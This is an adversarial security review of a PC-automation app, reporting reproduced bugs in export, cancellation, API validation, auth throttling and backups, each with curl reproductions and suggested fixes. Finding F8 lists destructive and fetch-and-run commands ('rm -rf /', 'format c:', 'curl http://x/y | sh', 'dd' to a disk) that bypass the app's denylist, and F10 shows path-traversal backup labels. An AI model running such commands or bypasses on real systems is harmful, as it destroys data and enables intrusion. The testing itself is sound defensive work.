# PC Rituals — Adversarial Review

**Reviewer role:** adversarial (break-it), not encouraging. Every item below was **executed and
reproduced** unless the row or the "Could not verify" section says otherwise.

**Revision under test:** `HEAD=9ce9210` (working tree dirty). Source fingerprint of
`pcrituals/**` (py/js/css/html) = `md5 6540a2eef8ed49fd88156d215dfde6c8` at 18:14 UTC.
**Important:** the working tree was being edited *while I reviewed* (HEAD moved `650ef9f` →
`9ce9210` mid-session; `api.py`, `app.py`, `platform.py`, `actions.py`, `web/app.js`, `wol.py`
all changed). Every finding below was re-run against the tree as of the fingerprint above.
Items that were fixed by the author during the review are listed separately at the end so they
are not mistaken for live defects.

**Environment / method**

- Linux host → Windows-only code (pywin32/ctypes/pywebview/`os.startfile`/`taskkill`/PowerShell)
  could not be *executed*. Those paths were read, and the platform seams (`_run`/`_popen`) were
  noted. Every "Windows" claim below is marked accordingly.
- Backend: `.venv/bin/python -m pytest tests/ -q` → **288 passed** (see F18 re the docs' claim).
  Attacks run against my own servers (`PCRITUALS_DATA_DIR=/tmp/rev*`, ports 8791/8793/8794) with
  `fastapi.testclient` and `httpx.ASGITransport` for in-process work. Servers I started are mine
  to leave; I did not touch the pre-existing 8765 process.
- Frontend: jsdom (`runScripts:"outside-only"`, stubbed `fetch`/`EventSource`, injected
  `DOMContentLoaded`), 12 malformed-payload scenarios × 8 pages.
- Scratch scripts (read-only w.r.t. the repo): `/opt/data/rev_scratch/atk_*.py`, `fe_attack*.js`.

---

## Findings (most severe first)

Reproduction notes: `$TOK` below is
`curl -s -XPOST localhost:8793/api/auth/login -H 'Content-Type: application/json' -d '{"username":"u3","password":"pass"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])'`
— substitute your own pair; the attack scripts spin up throwaway servers so they need no setup.

| ID | Sev | Area | Exact reproduction | Observed result | Why it matters | Suggested fix |
|----|-----|------|--------------------|-----------------|----------------|---------------|
| **F1** | **High** | Export / Import (claimed ✅) | `curl -s -H "Authorization: Bearer $TOK" localhost:8793/api/export \| python3 -c "import sys,json;d=json.loads(sys.stdin.read());print(type(d['rituals'][0]).__name__);print(d['rituals'][0][:90])"` then feed the same body back: `curl -s -XPOST localhost:8793/api/import -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d @export.json`. Script: `rev_scratch/atk_export.py` §A. | `type(d['rituals'][0]) == str` — every ritual is a Python **repr** string: `id='5ebe9139c722' name='MY OLD RITUAL' description='' actions=[Action(id='3eb6eca023f4', type=<ActionType.DELAY: 'delay'>...`. Re-importing the app's own export → `{"imported": 0, "errors": ["entry missing name/actions", "entry missing name/actions"]}`. A hand-written payload imports fine (control: `{"imported":1}`). | The advertised export is not importable — the round trip is **completely broken**. A user who "backs up" by exporting cannot restore, and the import modal accepts the file and silently imports nothing. Cause: `app.export_imports()` does `json.dumps({"rituals": self.store.list_rituals()}, default=str)`, and `default=str` stringifies pydantic models instead of serialising them. `vault.py::_exported_rituals` documents this bug and works around it — the underlying export was never fixed. | Dump models: `Ritual.model_dump(mode="json")` (or `json.loads(r.model_dump_json())`) instead of `default=str`. Add a test that exports then imports and asserts `imported == len(exported)`. |
| **F2** | **High** | Execution engine / cancellation honesty | `rev_scratch/atk_run.py` §1–2. Ritual = one `command` action `sleep 5`. Run it, wait 0.7 s, `POST /api/rituals/{id}/stop`, then poll `/api/history/{id}`. Re-verified on current tree. | `POST /stop` → `200 {"stopped": true}` at **t=0**, while `/api/run/current` says `state=cancelling` and history does not finalise until **t=4.6–5.3 s**. With `sleep 4; touch /tmp/marker`, the marker file is created **after** the cancel — the shell command ran to completion. | "Stop" is a lie: it returns success immediately, and the in-flight action (which on Windows is `cmd /c <anything>` — installers, `shutdown`, destructive commands) is **never interrupted**. A user who presses Stop on a runaway command believes it stopped; it doesn't. | Return `{"stopping": true}` (or 202) and document the semantics; better, actually kill the action: pass a cancel event into `Platform.run_command` and `_kill_tree()` the child on cancel (the timeout path already knows how). Surface `state=cancelling` in the UI. |
| **F3** | **Medium** | Ritual update (mass assignment) | `rev_scratch/atk_export.py` §F: create A ("AAA") and B ("BBB"); `curl -s -XPUT localhost:8793/api/rituals/<A.id> -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"id":"<B.id>","name":"PWNED"}'`. | `200`. After: **A = "AAA" (unchanged), B = "PWNED"**. `update_ritual()` does `existing.model_copy(update=data)` and then saves under whatever `id` the body supplied, so a request addressed to A writes to B. | A client that round-trips a fetched ritual (echo the object back after an edit) can silently rewrite an unrelated ritual, and any caller can target a different ritual than the URL says. Also a silent id-rewrite primitive. | Ignore `id` (and `created_at`) from the body: `data.pop("id", None)` before merging, or validate `data.get("id", ritual_id) == ritual_id` and 400 otherwise. |
| **F4** | **Medium** | API validation / 500s | `curl -s -o /dev/null -w '%{http_code}\n' -XPUT localhost:8793/api/rituals/<id> -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"actions":5}'` (same for `{"actions":"x"}`, `{"name":123}`). Script: `rev_scratch/atk_engine.py` §8. | **500 Internal Server Error** for all three, with an unhandled `pydantic_core.ValidationError` traceback in the server log, plus `PydanticSerializationUnexpectedValue` warnings. `PUT {}` and `{"enabled":"yes"}` return 200. | `PUT` is the only write path whose validation error isn't caught (create is wrapped), so client bugs become 500s — and the raw server error is logged as a stack trace. `{"enabled":"yes"}` being *accepted* also means typed junk is coerced. | Wrap the merge+validate in `try/except ValidationError` and return 400 with the pydantic message, as `create_ritual` already does. |
| **F5** | **Medium** | API validation / 500s | `curl -s -o /dev/null -w '%{http_code}\n' -XPOST localhost:8793/api/rituals/reorder -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"ids":null}'` (also `{"ids":5}`). | **500** — `reorder_rituals(None)` → `TypeError: 'NoneType' object is not iterable`. `{"ids":"abc"}` returns 200 and silently iterates the characters (`UPDATE ... WHERE id='a'`, no-ops). | Same class as F4 but on the ritual-ordering path the UI calls on every drag. A malformed body should be 400, not a 500 + traceback. | Validate `isinstance(ids, list)` (and that entries are strings) → 400 otherwise; return a count of matched rows so a bad id list isn't a silent no-op. |
| **F6** | **Medium** | API correctness | `curl -s -XPOST localhost:8793/api/rituals/doesnotexist123/run -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{}'` → `200 null`. | HTTP **200 with body `null`** instead of 404. | The phone/desktop UI treats 200 as success and then waits for progress from a run that was never created; the 404 path that exists for `GET`/`PUT`/`DELETE` is missing here. | In the `run` route, `if result is None: raise HTTPException(404, "ritual not found")`. |
| **F7** | **Medium** | Run lifecycle robustness (fault injection) | `rev_scratch/atk_brick2.py`: patch `app.store.append_history` to raise `OSError(28)`, run a 0.5 s ritual, wait 2 s, then inspect `app.registry.all()` and `GET /api/history/{rid}`. | The task dies with `Task exception was never retrieved ... OSError(28, 'No space left on device')`. The **history row is lost with no user-visible error**, and the runner is **never removed** from the registry (`registry now: {'87d3d0e89254': 'completed'}` — still present 2 s later, i.e. `registry.remove()` was skipped because `append_history` raised before it). `rev_scratch/atk_brick.py` shows the knock-on effect: an aborted write on the `Store` connection leaves SQLite locked, and every other request — **including `/api/auth/status`** — then fails with `sqlite3.OperationalError: database is locked` (500). `Store`, `Security` and `AuthManager` each open their **own** connection to the same file. | One transient write failure silently discards the run record (audit trail) and leaks the runner object; if the failure happened while the runner was still `RUNNING`, that ritual is 409-locked forever with no recovery short of a restart. The lock contamination additionally takes out authentication because three connections share one DB file. | Move `self.registry.remove(ritual_id)` into its own `finally` (or wrap the append in `try/except` + log/hub error event) so cleanup can never be skipped; retry/surface the history write; consider one shared `LockedConnection` per data dir instead of three. |
| **F8** | **Medium** | Import safety / claim vs reality | `rev_scratch/atk_export.py` §D–E: import rituals whose command is `rm  -rf /`, `rm\t-rf /`, `format\tc:`, `powershell -c "Remove-Item -Recurse -Force C:\Users"`, `curl http://x/y \| sh`, `dd if=/dev/zero of=/dev/sda`; then `POST /api/rituals {"type":"command","target":"shutdown /s /t 0"}` and `POST /api/deck {"kind":"command","target":"format c:"}`. | Denylist blocks only the exact spellings: `rm -rf /`, `shutdown`, `format ` (with trailing space), `del /s /q`. **Everything else imported `{imported: 1}`**: double-space, tab, PowerShell `Remove-Item`, `curl \| sh`, `dd`. Direct creation is **not filtered at all** — `shutdown /s /t 0` and `format c:` are accepted with `200`. | README claims import "blocks obviously destructive commands". It blocks a handful of literal strings and can be defeated by one extra space; and the filter is only in the import path, so a paired phone can create the same ritual/button directly. This is security theatre, not a control. | Either drop the claim or make it real: allow-list action types that may be imported, or prompt for confirmation on import of any `command`/`power` action and say what will run. Apply the same policy to `POST /api/rituals` and `POST /api/deck`. |
| **F9** | **Medium** | Docs vs defaults (security expectation) | `python3 -c "import sys;sys.path.insert(0,'/opt/data/pc-rituals');from pcrituals.config import Config,load_config;c=Config();print(c.host,c.bind_loopback_only,c.data_dir);print(load_config().bind_loopback_only)"` (with no `PCRITUALS_*` env vars). | `0.0.0.0 False /opt/data/.pcrituals/data` and `False`. README's env table says `PCRITUALS_LOOPBACK` default **`true`**, quick-start says "Run (default: **loopback** :8765)", and `PCRITUALS_DATA_DIR` default is listed as `/tmp/pcrituals`. All three are wrong: the default is **all interfaces**, data lives in `~/.pcrituals/data` (Windows `%LOCALAPPDATA%\PC Rituals\data`). | A user reads "loopback by default" and assumes the API is not on the LAN; it is bound to `0.0.0.0` (BUILD.md gets this right, README contradicts it). The API is token-gated, so this is not a direct compromise, but the stated security posture is false and the wrong data path misleads backups/troubleshooting. | Fix the README table + quick start to `PCRITUALS_LOOPBACK=false`, `host=0.0.0.0`, data dir `~/.pcrituals/data` / `%LOCALAPPDATA%\PC Rituals\data`. If "loopback unless you opt in" is the intent, change the code instead. |
| **F10** | **Medium** | Backups (unvalidated write path) | `rev_scratch/atk_backup2.py`: `curl -s -XPOST localhost:8793/api/backups -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"label":"/tmp/rev_probe_outside/abs"}'` (also `"../../../../../../tmp/rev_probe_outside/rel"`). | `200 {"backup": "/tmp/rev_probe_outside/abs-20260916-181556", ...}` — a directory is created **outside the data dir**, containing copies of `pcrituals.db`, `-wal`, `-shm` and `manifest.json`. The traversal label is echoed back. `../escaped` lands in the data-dir parent; `list_backups()` returns `[]`, and restore/delete by that name → **404** (invisible, unrestorable, undeletable). | `_backup_path()` explicitly guards read/delete against exactly this, but `create_backup()` does `self.backup_dir / f"{label}-{stamp}"` with no validation — and pathlib treats a **rooted** right operand as absolute, so an authenticated caller (including a **paired phone**, which can call `/api/backups`) can write a copy of the database to any path the process can write. | Run the label through the same `_safe_component`-style sanitiser used by `update.py` (or reject `/`, `\`, `..`, `:` and absolute paths) in `create_backup()`; then keep it inside `backup_dir` as `_backup_path` already enforces. |
| **F11** | **Low–Med** | Login throttle (self-inflicted DoS) | `rev_scratch/atk_throttle.py` §A: 5 × `POST /api/auth/login` with a wrong password, then the **correct** password. | `429 {"detail":"Too many attempts. Wait a few minutes and try again."}` for the correct password. No unlock path: `change_password` doesn't clear counters and there's no "reset login" endpoint — the account is unusable from that client for 5 minutes. Measured: 20 failures from one client also locks that client out of **all** usernames. | Correctly scoped per client IP, so a LAN attacker cannot lock out the desktop (verified — that part is solid), but any client that fumbles 5 passwords is locked out with no feedback beyond "wait", and a shared-address deployment (reverse proxy, NAT'd remote access) turns it into a real DoS. | Show the remaining lockout time; clear the counter on a *successful* password check when the username key isn't locked (or after a correct password for that username); expose a local-only unlock. |
| **F12** | **Low** | User enumeration | `rev_scratch/atk_auth.py` §7: time `POST /api/auth/login` with an existing username + wrong password vs a nonexistent username + wrong password. | Both → `401 {"detail":"Incorrect username or password"}`, but **0.067 s vs 0.002 s (41×)** — PBKDF2 only runs for existing users. | The identical message is defeated by timing: an attacker on the LAN can enumerate valid usernames. | Always run one PBKDF2 verification against a dummy hash when the user is unknown (constant-ish work), or throttle per-client before the lookup. |
| **F13** | **Low** | Pairing brute force (no throttle) | `rev_scratch/atk_pairing.py`: `POST /api/pair/complete` with a wrong code in a loop / with 50 threads, while a real code is live. | No rate limit of any kind — 300 wrong guesses then another guess still accepted, and the real code still redeemable. Measured **872 req/s** with 50 threads → sweeping the 16⁶ keyspace takes **≈321 min**, i.e. not feasible inside the 300 s TTL. | The single-use/expiry design holds (see below), so this is a latent weakness rather than a break: any future change to code length/TTL or a faster server turns it into full PC control. | Add the same sliding-window limiter already used for login, keyed on client IP, to `/api/pair/complete`. |
| **F14** | **Low** | Input validation | `curl -s -o /dev/null -w '%{http_code}\n' "localhost:8793/api/history?limit=-1" -H "Authorization: Bearer $TOK"`; also `limit=0`, `limit=99999999999`. | `limit=-1` and `limit=99999999999` → `200` with the **entire** history (SQLite treats `LIMIT -1` as unlimited, and nothing caps the value). `limit=abc` → 422. | An unauthenticated-ish (well, authenticated) client can force the server to serialise unbounded history; `-1` is not a sane API value. | Clamp: `limit = max(1, min(limit, 1000))`. |
| **F15** | **Low** | Engine / timeout handling | `rev_scratch/atk_brick2.py` §timeout-ceiling: ritual with `{"type":"command","target":"sleep 3","timeout":1e9}`; compare with `{"type":"delay","params":{"seconds":0.05},"timeout":1e9}`. | The **command** action fails in 0.3 s with `detail: "timeout is too large"` (raw `OverflowError` from `subprocess.run(timeout=…)`, reproduced standalone: `python3 -c "import subprocess;subprocess.run(['sleep','1'],timeout=1e9)"`). The **delay** action with the same timeout completes fine. `timeout=-1` / `0` are sensibly clamped to the 30 s default. | A user typing a large timeout into the builder gets an incomprehensible failure and a "failed" run; the raw OverflowError string is surfaced to the UI as the step detail. | Clamp the timeout to a sane maximum (`min(timeout, 86400)`) in `engine._run_action`/`_run_command` before use. |
| **F16** | **Low** | Token handling | `curl -s -o /dev/null -w '%{http_code}\n' "localhost:8793/api/rituals?token=$TOK"`; `grep -n "EventSource" pcrituals/web/app.js` → `new EventSource(apiBase + "/events?token=" + encodeURIComponent(token))`. | A bearer token in a **query parameter** is accepted on every endpoint (200), and the SSE stream always carries the token in the URL. | Tokens in URLs leak into request logs, `Referer`, proxy logs and browser history; the documented model is a header. | Keep the query-param fallback only for `/events` (EventSource cannot set headers) and drop it everywhere else. |
| **F17** | **Low** | Frontend robustness | `rev_scratch/fe_attack.js` scenarios `html-200` and `history=weird`. | With a `200` + `text/html` body on `/api/backups`, the **Settings page is replaced by the error card**: `state.backups.map is not a function`. With `history` containing a `null` entry, the **Activity page** shows the error card: `Cannot read properties of null (reading 'status')`. Also, with any non-object body on `/api/auth/status`, the app falls back to the **sign-in screen while keeping a valid token** (recoverable on reload). | `refreshRituals`/`refreshHistory`/`refreshDevices` were hardened with `Array.isArray`, but backups and per-item shapes were not, so a proxy/captive-portal HTML body or a stale shape degrades the UI to an error card. Consistency gap, not a crash-spiral. | Apply the same boundary guards to `refreshBackups` and to item shapes (filter non-object history/ritual entries); treat an unparseable `/auth/status` as "unknown, keep the session" instead of "sign in". |
| **F18** | **Low** | Docs vs reality | `grep -n "Ritual action" USER_GUIDE.md`; `.venv/bin/python -m pytest tests/ -q \| tail -1`; `grep -n "RitualType\|ActionType" pcrituals/models.py`; `grep -n "PC Rituals.exe" BUILD.md`. | USER_GUIDE: "You can also put **Rituals inside other Rituals** using the **Ritual** action" — **no such action type exists** (`ActionType` = app/game/website/file/command/delay/close/power; the builder offers 8 buttons, no Ritual). BUILD.md: "109 automated tests pass" — the suite is now **288**. BUILD.md gives two different build outputs (`dist\PC Rituals\PC Rituals.exe` vs `dist\PC Rituals.exe`). USER_GUIDE: "Nothing is sent to the cloud" — auto deck icons are loaded from `https://www.google.com/s2/favicons?...` (`icons.py`), and integration detection/update checks make outbound calls. | Users follow the guide and find no such control; a stale test count makes reviewers distrust the "Verified state" section; the privacy claim is stronger than the software. | Fix the guide (deck buttons are the supported nesting path — `DeckKind.RITUAL` does exist), update the test count, pick one exe path, and soften/qualify the "nothing sent to cloud" line. |
| **F19** | **Low** | Data-dir migration | `mkdir -p /tmp/brand_new && PCRITUALS_DATA_DIR=/tmp/brand_new .venv/bin/python -m pcrituals` on a host where `/tmp/pcrituals/pcrituals.db` exists (it does here). | The brand-new data dir comes up already containing another directory's `pcrituals.db` (36 KB, same mtime) — including its **users and sessions tables**; `GET /api/rituals` immediately shows a ritual the operator never created. `config._legacy_data_dirs()` includes `tempfile.gettempdir()/pcrituals`. | Documented as a migration, but it means a "fresh" install silently adopts state from a world-writable `/tmp` path on Linux (an attacker who can create `/tmp/pcrituals/pcrituals.db` plants an account + session that the app adopts). | Before importing a legacy dir, require that it is owned by the current user and not world/group-writable; skip `/tmp` entirely unless the target dir is empty *and* the user confirms. |
| **F20** | **Low** | Frontend XSS (hardening note) | `grep -n "qr_png" pcrituals/web/app.js` → `<img src="${res.qr_png}">` (unescaped), vs `esc()` used for artwork/deck icons. | Not exploitable today: `qr_png` is server-generated (`data:image/png;base64,...`) and I could not make any endpoint return attacker-controlled content in that field. Every other user-controlled field I tried (ritual name/target/notes, deck label/target/icon, history name/detail, media title/artist/display) is escaped — see "Could not break". | One unescaped sink in the template layer is an invitation for a future refactor to turn into DOM XSS. | Use `esc(res.qr_png)` for consistency (or set `img.src` via a property rather than innerHTML). |

---

## Could not verify (tried, could not run or could not reproduce)

1. **Windows-only execution.** `WindowsPlatform.launch/open_path/open_website/run_command/_kill_tree/
   close_application/power/list_running_processes`, `desktop.py`'s pywebview/WebView2 window,
   the PyInstaller build (`pcrituals.spec`, `build_windows.bat`, `dist\PC Rituals.exe`), the
   updater's `apply()` (it refuses on non-Windows), media keys and integration detection all
   require Windows and were **read, not executed**. Specifically unverified by execution:
   the `taskkill /F /T` tree-kill, the `_image_name()` normalisation, PowerShell power commands,
   and whether F2's "cancel doesn't stop the command" behaves identically there (the code path
   is the same — no cancellation hook exists — but I could not prove it on Windows).
2. **A spurious server-side 401 that logs the user out.** I attacked the frontend's 401 handler
   instead: a 401 on `/pair/*` keeps the token, a 401 on `/auth/status` keeps the token (and
   shows sign-in), a 401 on any other endpoint clears it and reloads — correct as documented.
   I could not produce a *spurious* 401 from the server (session validation never returned None
   for a live token in my runs; the DB-lock case surfaces as a 500, not a 401). So "the 401 path
   cannot log a user out spuriously" is **verified for the frontend, not disproven for the server**.
3. **The `math is not defined` failure.** At 18:01 UTC (mid-session) `pcrituals/actions.py`
   referenced `math.isfinite()` without `import math`; every negative/NaN delay and every retried
   action failed with `name 'math' is not defined`. That was a **transient working-tree state**
   caused by the author editing concurrently; the current tree imports `math` and negative delays
   now fail cleanly with `delay cannot be negative`. Recorded as a caution about reviewing a live
   tree, not as a standing defect.
4. **Frontend paths that need inline `onclick`.** With jsdom `runScripts:"outside-only"` the
   inline handlers (`onclick="editRitual(...)"`, `addAction(...)`, `pressDeck(...)`) are never
   compiled, so I could not *drive* the builder's add-action buttons, the Edit button, or a deck
   press through the real UI. I exercised those pages only with data (they rendered, `chars>0`,
   no JS errors — the builder shows "Select a ritual to edit." until a ritual is opened, which is
   correct). The `window[f] = window[f]` line at `app.js:847` is a no-op, which is harmless only
   because the functions are top-level `function` declarations; worth tightening.
5. **SSE through `httpx.ASGITransport`** timed out (streaming artefact of the transport), so my
   first SSE attempt was inconclusive. Re-verified over real HTTP instead (see "Could not break").
6. Anything requiring a **second physical machine or a real iPhone**: the QR flow
   (`create_pairing_code` → `qr_png` → `#/remote?code=`) was exercised at the API level only.
7. **Frontend design/tokens.** `pcrituals/web/liquid-glass.css` and `tokens.css` exist in the
   bundle directory but are not linked from `index.html` nor `@import`ed by `styles.css` — I
   flag this only as "dead weight in the bundle"; they were added minutes before this review and
   are presumably in flight. Not a defect.

---

## Tried hard and could not break (verified solid)

**Auth boundary** (`rev_scratch/atk_auth.py`, `atk_pairing.py`, `atk_throttle*.py`)

- All 18 control endpoints I probed (`/rituals`, `/status`, `/history`, `/devices`, `/deck`,
  `/backups`, `/export`, `/settings`, `/media/now`, `/pair/start`, `/power`, `/rituals/reorder`,
  `/voice`, `/integrations`, `/update/status`, `/wol`, `/spotify/status`, `/auth/sessions`)
  return **401 from loopback** once an account exists. No unauthenticated read or control.
- Malformed/empty/whitespace/`null`/`undefined`/wrong-length/`Bearer Bearer x`/`pcrit…` tokens →
  401. A revoked device token → 401 immediately. A logged-out session token → 401.
- Second-account creation → 409; the 12-way concurrent `/auth/setup` race on a virgin server
  produced **exactly one 200 and eleven 400s** (the user guard is inside the lock).
- `/api/pair/complete` is unauthenticated by necessity: an invalid code → 401; a valid code is
  **single-use sequentially and under 20 concurrent redemptions** (exactly 1 success); a
  lower-case code redeems *and* consumes the code (the `_normalise_code` fix holds); a device
  token grants control (by design) and `revoke` kills it instantly; `revoke-all` works.
- Login lockout cannot be used to lock out *another* client (keys include the client address, and
  `X-Forwarded-For` is not honoured — there is no trust of spoofed client identity).
- The failure dict cannot be grown without bound by username spraying: the 20-failure per-client
  cap fires first (sustained ~925 req/s of 429s, dict bounded).

**Sync server** (`rev_scratch/atk_sync.py`, `atk_sync2.py`, `atk_sync3.py`)

- **Cross-account isolation holds**: A's token cannot read or write B's vault and `/sync/me`
  always reports A. Pushing A's vault with B's revision number stays inside A's account.
- **Revision conflicts are race-safe**: 8 concurrent `PUT /sync/vault` at the same
  `base_revision` → exactly **one 200, seven 409** (the compare-and-set is inside the store lock).
  `base_revision` junk (`None`, `"abc"`, `[1]`) → 400; stale/negative/future → 409 with the
  current revision included.
- **Oversized vault** → `413 {"vault is too large (812627 bytes, limit 524288)"}` on both the
  normal and the `force` write. Hostile keys (`__proto__`, `constructor`) are stored as inert
  data; a 200-deep nested object is handled.
- **Delete account then reuse the token** → token 401, vault gone, re-registering the same
  username starts empty (no data resurrection). Deleting requires the password, not just a token.
- **The sync token does not leak into a pushed vault**: `build_vault()` on a live app with a
  configured sync token contains neither the token nor the substring `token` anywhere;
  `public_state()` never includes it; on disk it is `0600`.
- Unauthenticated `/sync/me`, `/sync/vault`, `/sync/account`, `/sync/vault/force` → 401.

**Concurrency** (`rev_scratch/atk_conc.py`, against live servers)

- 600 requests / 40 workers of interleaved reads, ritual creation, backup creation and bad logins
  → `{200: 525, 401: 10, 429: 65}`, **zero 5xx, zero transport errors** (362 req/s).
- 300 requests / 24 workers interleaving `run` + `stop` + `run/current` + `history` +
  `devices/revoke-all` → `{200: 242, 409: 58}`, **zero 5xx**; every 409 is the by-design
  "ritual already running".
- 16 simultaneous `run` calls on one ritual → **one** 200, fifteen 409, and exactly **one**
  history entry — no double execution.
- No stuck registry locks, no state disagreement between `/rituals`, `/history` and
  `/run/current` (76 listed == 75 created + 1 control).

**Execution engine** (`rev_scratch/atk_engine.py`)

- 0 actions → `completed`, honestly reported (0/0, `/run/current` → not running).
- 50 actions → `completed`, 50/50, in 0.2 s.
- Duplicate action ids → both steps run, both recorded (`['SAMEID','SAMEID']`); ids are not used
  as keys during execution.
- Missing params fail safely and legibly, one step at a time, honouring `stop_on_error`:
  `unsupported power action: None`, `missing command`, `missing website URL`, `missing application`,
  `delay seconds must be a number, got 'abc'`, `delay cannot be negative`.
- Junk `retries` (`"two"`) is tolerated (falls back to 0); unknown action types are rejected with
  **400 at create** (pydantic), so they never reach the engine.
- `timeout` of `-1`/`0` is clamped to the 30 s default rather than failing instantly.
- `/api/power`: `shutdown` without `confirm` → 400; unknown action → 400; `/api/voice` requires
  `confirm: true` for shutdown and reports `needs_confirmation` otherwise; `/api/media/control`
  rejects unknown actions and `seek` without Spotify (400).
- `/api/wol/wake` validates MAC format (`zz:…` → "invalid hex", `1:2:3:4:5:6` → "must be 6 bytes",
  empty → 400, valid dotted and bare-hex forms accepted).
- Backup **read/delete** traversal is properly refused (`_backup_path` → 404/"invalid backup
  name"), deck `kind` validation rejects unknown kinds (400), a deck press for a missing button
  → 404.

**Frontend** (`rev_scratch/fe_attack.js`, `fe_attack2.js`)

- Baseline renders all 8 pages with zero JS errors and zero unhandled rejections.
- Malformed payloads (bare `null`, `{}`, a string, an array where an object is expected,
  `500` everywhere, array-of-junk rituals, hostile shapes) produced **no JS errors, no unhandled
  rejections, no blank pages and no crash-spiral** — only the two error cards in F17.
- **No XSS**: hostile strings in ritual `name`/`target`/`notes`, deck `label`/`target`/`icon`,
  history `ritual_name`/`error`/step details and media `title`/`artist`/`display` produced **0**
  injected elements and never executed a handler (`esc()` is applied consistently).
- The onboarding tour appears only when `onboarded:false` and can be stepped to the end without
  errors; it does not appear for an onboarded user.
- The 401 handling is correct in all three cases I could construct (real expiry → token cleared +
  reload; `/pair/*` → kept; `/auth/status` → kept).

**SSE** (`rev_scratch/atk_sse.py`, real HTTP)

- `/api/events` → 401 without a token. With one, a run delivers, in order:
  `started` → `step_start` → `step_done` → `finished` → `system/history_updated`, with the full
  step payloads. The claimed "Live progress via SSE" works.

---

## Changed under me during the review (do not re-report as live)

- **`HEAD` moved `650ef9f` → `9ce9210` while I worked.** `pcrituals/api.py`, `app.py`,
  `platform.py`, `actions.py`, `web/app.js` and `wol.py` were all modified; `SYNC.md`,
  `tests/test_sync_api.py`, `tests/test_windows_paths.py`, `DESIGN_NOTES.md`, `DESIGN_TOKENS.md`
  appeared; the suite grew from **191 to 288 passing tests**.
- **Sync is no longer dead code.** At 650ef9f nothing imported `SyncLink` and there were no
  `/api/sync/*` routes. As of 9ce9210, `App.__init__` builds `self.sync = SyncLink(config)` and
  `api.py` exposes `/sync/status|connect|…`. I therefore **withdrawn** my planned finding that
  the sync feature is unreachable from the app. (I did not have time to re-attack those new
  routes beyond the transport-level attacks already listed above.)
- `SYNC.md` says sync holds "rituals and settings only — never anything that can control a PC".
  The vault also carries **deck** buttons, and rituals themselves contain `command` and `power`
  actions — the truthful statement is "the *server* never executes anything", and the document
  should say that instead.
- The `math is not defined` breakage (see "Could not verify" #3) was a mid-edit transient.

---

## Top three, with the exact observed output

1. **F1 — export/import round trip is broken (High).** `GET /api/export` → `type(parsed['rituals'][0]) == str`
   (`id='5ebe9139c722' name='MY OLD RITUAL' … <ActionType.DELAY: 'delay'>`); re-importing it →
   `{"imported": 0, "errors": ["entry missing name/actions", "entry missing name/actions"]}`.
2. **F2 — "Stop" lies and the command keeps running (High).** `POST /stop` → `200 {"stopped": true}`
   at t=0; history finalises **4.6 s later**; the cancelled `sleep 4; touch /tmp/marker` command
   **created the marker after the cancel**.
3. **F3 — a PUT can rewrite a different ritual (Medium).** `PUT /api/rituals/A {"id": B, "name": "PWNED"}`
   → `200`; afterwards **A = "AAA", B = "PWNED"**.
